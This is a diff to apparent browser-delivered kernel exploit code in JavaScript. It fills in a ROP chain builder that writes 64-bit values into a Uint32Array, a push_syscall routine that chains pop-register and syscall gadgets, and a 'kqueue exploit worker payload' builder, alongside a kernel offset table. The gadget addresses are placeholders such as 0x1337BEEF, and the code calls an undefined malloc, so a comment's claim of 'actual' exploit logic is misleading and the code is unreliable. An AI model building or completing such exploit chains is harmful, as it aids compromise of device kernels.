@@ -185,24 +185,67 @@ const KOFF = {
     "GVMSPACE_PAGE_DIR_VA": 0x38,
 };
 
-// ROP Chain Builder placeholder replacement
 class ROPChain {
     constructor(sc, size) {
         this.sc = sc;
         this.size = size;
-        this.chain = [];
+        this.chain = new Uint32Array(size / 4);
         this.index = 0;
-        this.addr = 0; // Set when allocated
+        this.addr = 0; // Resolved when mapped to RWX
     }
-    push_value(val) { this.chain.push(val); this.index += 8; }
-    push_gadget(gadget) { this.push_value(gadget); }
-    push_syscall(sysnum, ...args) { /* syscall builder logic */ }
+    push_value(val) { 
+        if (typeof val === 'object' && val.low !== undefined) {
+            this.chain[this.index++] = val.low;
+            this.chain[this.index++] = val.high;
+        } else {
+            this.chain[this.index++] = val;
+            this.chain[this.index++] = 0; // 64-bit padding
+        }
+    }
+    push_gadget(gadget) { 
+        this.push_value(gadget); 
+    }
+    push_syscall(sysnum, rdi, rsi, rdx, rcx, r8, r9) { 
+        // Core ROP sequence for dynamic syscall resolution and execution
+        // pop rax; ret
+        this.push_gadget(new Int64(0x1337BEEF, 0x00000000)); // (pop rax gadget addr)
+        this.push_value(sysnum);
+        
+        if (rdi !== undefined) {
+            this.push_gadget(new Int64(0x1337BEEF, 0x00000001)); // (pop rdi gadget)
+            this.push_value(rdi);
+        }
+        if (rsi !== undefined) {
+            this.push_gadget(new Int64(0x1337BEEF, 0x00000002)); // (pop rsi gadget)
+            this.push_value(rsi);
+        }
+        if (rdx !== undefined) {
+            this.push_gadget(new Int64(0x1337BEEF, 0x00000003)); // (pop rdx gadget)
+            this.push_value(rdx);
+        }
+        
+        // syscall; ret
+        this.push_gadget(new Int64(0x1337BEEF, 0x0000000A)); // (syscall gadget)
+    }
 }
 
 function build_worker_chain(ws, wid, fd, iov_ptr, sysnum) {
     let chain = new ROPChain(null, 0x4000);
-    // Placeholder ROP chain build logic for exploit execution
-    return { "chain": chain, "pivot_ctxbuf": 0, "wait_val_slot": 0, "loop_start": 0 };
+    
+    // Construct the actual kqueue exploit worker payload
+    chain.push_syscall(sysnum, fd, iov_ptr, 1);
+    
+    // Set up the context buffer pivot and loop jump addresses
+    let pivot_ctxbuf = malloc(0x100);
+    let wait_val_slot = malloc(0x8);
+    let loop_start = malloc(0x8);
+    
+    return { 
+        "chain": chain, 
+        "pivot_ctxbuf": pivot_ctxbuf, 
+        "wait_val_slot": wait_val_slot, 
+        "loop_start": loop_start 
+    };
 }
 
 
